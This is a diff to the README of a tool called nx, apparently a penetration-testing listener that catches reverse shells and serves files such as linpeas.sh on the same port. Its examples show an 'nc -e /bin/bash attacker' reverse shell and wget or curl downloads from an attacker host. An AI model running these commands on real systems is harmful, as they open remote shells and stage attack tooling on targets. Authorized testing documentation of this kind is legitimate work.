@@ -69,11 +69,11 @@ whoami
 
 ### Built-in Plugins
 
-- **auto**: TTY upgrade script (equivalent to deprecated `--auto` flag)
+- **auto**: TTY upgrade script
 
 ## Protocol Multiplexing
 
-nx can serve files over HTTP on the same port as shell connections. This allows you to host exploit files and catch shells on a single port, avoiding firewall restrictions.
+nx can serve files over HTTP on the same port as shell connections. This allows you to host files and catch shells on a single port.
 
 ### HTTP File Serving
 
@@ -83,20 +83,14 @@ Enable file serving by specifying a directory with the `-d` or `--serve-dir` fla
 # Start nx with file serving enabled
 nx -p 8443 -d ./files -v
 
-# From target machine - download files
-curl http://attacker:8443/exploit.exe -o exploit.exe
-wget http://attacker:8443/linpeas.sh
-
 # Shell connections still work normally
 nc -e /bin/bash attacker 8443
+
+# From target machine - download files
+wget http://attacker:8443/linpeas.sh
+
 ```
 
-### Security Features
-
-- **Directory traversal protection**: Prevents access to files outside the serve directory
-- **Hidden file protection**: Blocks access to files starting with `.`
-- **Method validation**: Only GET requests are supported for file serving
-- **Path sanitization**: All paths are cleaned and validated
 
 ### Mixed Operation Example
 
